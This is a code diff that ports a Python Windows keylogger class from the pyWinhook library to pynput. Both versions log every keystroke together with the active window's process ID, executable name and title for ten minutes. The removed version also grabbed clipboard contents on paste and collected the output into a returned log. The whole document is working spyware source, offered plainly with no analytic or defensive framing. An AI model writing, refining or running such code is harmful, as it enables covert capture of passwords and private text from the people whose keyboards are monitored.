@@ -1,73 +1,64 @@
 from ctypes import byref, create_string_buffer, c_long, windll
-from io import StringIO
-
-import os
-import pythoncom
-import pyWinhook as pyHook
-import sys
+from pynput import keyboard
 import time
-import win32clipboard
 
-TIMEOUT = 60*10
+TIMEOUT = 60 * 10  # 10 minutes
 
 class Keylogger:
     def __init__(self):
-        self.current_window = None
-    
+        self.current_window_handle = None
+
     def get_current_process(self):
         hwnd = windll.user32.GetForegroundWindow()
         pid = c_long(0)
         windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
-        process_id = f'{pid.value}'
-        executable = create_string_buffer(512)
-        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
-        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
-        window_title = create_string_buffer(512)
-        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
-        
-        try:
-            self.current_window = window_title.value.decode()
-        except UnicodeDecodeError as e:
-            print(f'{e}:  window name unkown')
 
-        print('\n', process_id, executable.value.decode(), self.current_window)
+        executable = create_string_buffer(512)
+        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid.value)
+        windll.psapi.GetModuleBaseNameA(h_process, None, executable, 512)
+
+        window_title = create_string_buffer(512)
+        windll.user32.GetWindowTextA(hwnd, window_title, 512)
+
+        try:
+            window_name = window_title.value.decode()
+        except UnicodeDecodeError:
+            window_name = "Unknown"
+
+        print(f'\n[PID: {pid.value}] {executable.value.decode()} - {window_name}')
 
         windll.kernel32.CloseHandle(hwnd)
         windll.kernel32.CloseHandle(h_process)
 
-    def mykeystroke(self, event):
-        if event.WindowName != self.current_window:
+        self.current_window_handle = hwnd  # Save current window handle
+
+    def mykeystroke(self, key):
+        new_window = windll.user32.GetForegroundWindow()
+        if new_window != self.current_window_handle:
             self.get_current_process()
-        
-        if 32 < event.Ascii < 127:
-            print(chr(event.Ascii), end='')
-        else:
-            if event.Key == 'V':
-                win32clipboard.OpenClipboard()
-                value = win32clipboard.GetClipboardData()
-                win32clipboard.CloseClipboard()
-                print(f'[PASTE] - {value}')
+
+        try:
+            if hasattr(key, 'char') and key.char is not None:
+                print(key.char, end='', flush=True)
             else:
-                print(f'{event.Key}')
-                
-        return True
-            
+                print(f'[{key}]', end='', flush=True)
+        except Exception as e:
+            print(f'[Error capturing key: {e}]', flush=True)
+
 def run():
-	save_stdout = sys.stdout
-	sys.stdout = StringIO()
-	kl = Keylogger()
-	hm = pyHook.HookManager()
-	hm.KeyDown = kl.mykeystroke
-	hm.HookKeyboard()
-	
-	while time.thread_time < TIMEOUT:
-		pythoncom.PumpWaitingMessages()
-		
-	log = sys.stdout.getvalue()
-	sys.stdout = save_stdout
-	return log
+    kl = Keylogger()
+    kl.get_current_process()  # Initialize first window
+
+    start_time = time.time()
+
+    def on_press(key):
+        kl.mykeystroke(key)
+        if time.time() - start_time > TIMEOUT:
+            return False  # Stop listener
+
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
 
 if __name__ == '__main__':
-    print(run())
-    print('Done.')
-            
+    run()
+    print('\nDone.')
